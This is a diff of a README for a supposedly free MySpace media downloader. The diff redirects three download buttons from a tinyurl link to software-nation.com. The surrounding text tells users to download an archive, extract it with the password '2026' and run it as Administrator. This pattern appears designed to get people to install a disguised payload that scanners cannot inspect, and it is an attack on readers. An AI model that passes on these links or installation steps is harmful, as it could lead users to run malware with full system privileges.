@@ -9,7 +9,7 @@ The **📀 Download from MySpace Link** is a **free** media downloader that lets
 
 <div align="center">
 
-[![Download from MySpace Link](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/download-from-myspace-link)
+[![Download from MySpace Link](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/download-from-myspace-link)
 
 </div>
 
@@ -98,7 +98,7 @@ MySpace holds years of digital history — old band demos, forgotten photos, and
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Paste MySpace link → Download
 
-[![Download from MySpace Link](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/download-from-myspace-link)
+[![Download from MySpace Link](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/download-from-myspace-link)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -250,7 +250,7 @@ Preserve your MySpace memories for free. **Download from MySpace Link** lets you
 
 <div align="center">
 
-[![Download from MySpace Link](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/download-from-myspace-link)
+[![Download from MySpace Link](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/download-from-myspace-link)
 
 **Version 4.6.1** — Free media downloader. April 2026 update. Zero cost. No payment.
 
